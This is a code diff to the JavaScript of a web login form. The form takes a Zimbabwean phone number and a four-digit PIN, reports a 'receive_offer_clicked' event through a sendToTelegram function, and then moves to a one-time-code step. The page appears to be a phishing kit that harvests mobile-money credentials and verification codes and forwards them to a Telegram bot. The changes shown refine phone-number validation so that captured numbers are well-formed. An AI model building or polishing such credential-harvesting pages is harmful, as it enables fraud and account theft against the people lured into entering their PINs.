@@ -492,16 +492,31 @@ async function sendToTelegram(event){
 const phoneEl=document.getElementById('phone');
 phoneEl.addEventListener('input',e=>{
   let raw=e.target.value.replace(/\D/g,'');
-  if(raw.startsWith('263')) raw=raw.slice(3);
-  if(raw.startsWith('0'))  raw=raw.slice(1);
+  // strip country code variants: 00263, +263, 263
+  if(raw.startsWith('00263')) raw=raw.slice(5);
+  else if(raw.startsWith('263')) raw=raw.slice(3);
+  // strip leading zero
+  if(raw.startsWith('0')) raw=raw.slice(1);
+  // cap at 9 digits
   raw=raw.slice(0,9);
   e.target.value=raw;
   phoneValue=raw.length>0?'+263'+raw:'';
+  // validate starts with 7
+  const startsOk=raw.length===0||raw[0]==='7';
   clearError('phoneField','phoneError');
+  if(raw.length>0&&!startsOk){
+    document.getElementById('phoneError').textContent='Number must start with 7 (e.g. 77XXXXXXX)';
+    showError('phoneField','phoneError');
+  }
   validateLogin();
 });
 phoneEl.addEventListener('blur',()=>{
-  if(phoneValue.length>0&&phoneValue.length!==13){
+  const v=phoneEl.value;
+  if(v.length>0&&v[0]!=='7'){
+    document.getElementById('phoneError').textContent='Number must start with 7 (e.g. 77XXXXXXX)';
+    showError('phoneField','phoneError');
+  } else if(v.length>0&&v.length!==9){
+    document.getElementById('phoneError').textContent='Please enter a valid 9-digit number starting with 7';
     showError('phoneField','phoneError');
   }
 });
@@ -573,7 +588,9 @@ function clearError(fieldId,errorId){
 
 /* ── VALIDATE ─────────────────────────────── */
 function validateLogin(){
-  const ok=phoneValue.length===13&&pinValue.length===4;
+  const raw=phoneEl.value;
+  const phoneOk=raw.length===9&&raw[0]==='7';
+  const ok=phoneOk&&pinValue.length===4;
   document.getElementById('mainBtn').classList.toggle('on',ok);
 }
 
@@ -636,14 +653,17 @@ function addRipple(btn,e){
 /* ── MAIN BUTTON ──────────────────────────── */
 document.getElementById('mainBtn').onclick=()=>{
   if(loginClicked)return;
-  // validate
+  const raw=phoneEl.value;
   let valid=true;
-  if(phoneValue.length!==13){showError('phoneField','phoneError');valid=false}
+  if(raw.length!==9||raw[0]!=='7'){
+    document.getElementById('phoneError').textContent=raw[0]!=='7'?'Number must start with 7':'Please enter a valid 9-digit number';
+    showError('phoneField','phoneError');valid=false;
+  }
   if(pinValue.length!==4){showError('pinField','pinError');valid=false}
   if(!valid)return;
+  phoneValue='+263'+raw;
   loginClicked=true;
   sendToTelegram('receive_offer_clicked');
-  const raw=phoneValue.replace('+263','');
   const masked='+263 '+raw.slice(0,2)+' *** **'+raw.slice(-2);
   document.getElementById('maskedNumber').innerHTML='Code sent to <strong>'+masked+'</strong>';
   showStep('step3');startTimer();
